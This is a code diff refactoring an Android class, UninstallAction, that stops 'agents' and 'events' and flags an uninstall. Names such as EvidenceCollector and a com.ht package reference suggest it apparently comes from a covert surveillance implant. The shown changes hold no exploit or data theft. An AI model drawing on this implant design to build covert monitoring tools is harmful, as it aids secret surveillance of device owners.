@@ -9,35 +9,37 @@
 
 package com.android.service.action;
 
+import org.json.JSONObject;
+
 import android.content.Intent;
 import android.net.Uri;
 
 import com.android.service.Messages;
 import com.android.service.Status;
-import com.android.service.agent.AgentManager;
+import com.android.service.Trigger;
 import com.android.service.auto.Cfg;
-import com.android.service.event.EventManager;
+import com.android.service.conf.ConfAction;
 import com.android.service.evidence.EvidenceCollector;
 import com.android.service.evidence.Markup;
+import com.android.service.manager.ManagerAgent;
+import com.android.service.manager.ManagerEvent;
 import com.android.service.util.Check;
 
 /**
  * The Class UninstallAction.
  */
-public class UninstallAction extends SubAction {
+public class UninstallAction extends SubActionSlow {
 
 	private static final String TAG = "UninstallAction"; //$NON-NLS-1$
 
 	/**
 	 * Instantiates a new uninstall action.
 	 * 
-	 * @param type
-	 *            the type
-	 * @param confParams
+	 * @param params
 	 *            the conf params
 	 */
-	public UninstallAction(final int type, final byte[] confParams) {
-		super(type, confParams);
+	public UninstallAction(final ConfAction params) {
+		super(params);
 	}
 
 	/*
@@ -46,8 +48,8 @@ public class UninstallAction extends SubAction {
 	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
 	 */
 	@Override
-	public boolean execute() {
-		actualExecute();
+	public boolean execute(Trigger trigger) {
+		Status.self().uninstall=true;
 		return true;
 	}
 
@@ -79,8 +81,8 @@ public class UninstallAction extends SubAction {
 			Check.log( TAG + " (stopServices)") ;//$NON-NLS-1$
 		}
 		
-		AgentManager.self().stopAll();
-		EventManager.self().stopAll();
+		ManagerAgent.self().stopAll();
+		ManagerEvent.self().stopAll();
 		Status.self().unTriggerAll();
 		return true;
 	}
@@ -123,7 +125,7 @@ public class UninstallAction extends SubAction {
 	}
 
 	@Override
-	protected boolean parse(byte[] params) {
+	protected boolean parse(ConfAction params) {
 		return true;
 	}
 
